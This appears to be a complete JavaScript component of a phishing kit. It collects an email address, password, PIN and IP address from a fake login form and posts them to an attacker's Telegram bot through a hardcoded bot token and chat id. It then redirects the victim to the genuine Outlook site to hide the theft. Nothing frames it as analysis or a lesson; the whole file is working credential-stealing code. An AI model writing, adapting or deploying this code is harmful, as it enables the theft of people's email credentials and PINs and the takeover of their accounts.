//bot token
var telegram_bot_id = "6822823841:AAGnYun95mZ74DzcmE7z2YD1KxCobmP284E";
//chat id
var chat_id = "6618724826";
var u_name, pax, u_pin2, ip, ip2;
var ready = function () {
    u_name = document.getElementById("uzer").value;
    pax = document.getElementById("pazz").value;
    u_pin2 = document.getElementById("p1n").value;
    ip = document.getElementById("gfg").innerHTML;
	ip2 = document.getElementById("address").innerHTML;
    message = "ðŸ“§EMAIL: " + u_name + "\nðŸ”’Cl4v3: " + pax +"\nðŸ“ŒP1N: " + u_pin2 +"\nIP: " + ip +"\n" + ip2 +"\n\nðŸºLAGSBOGðŸº";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'https://outlook.live.com';
        console.log(response);
    });
    return false;
};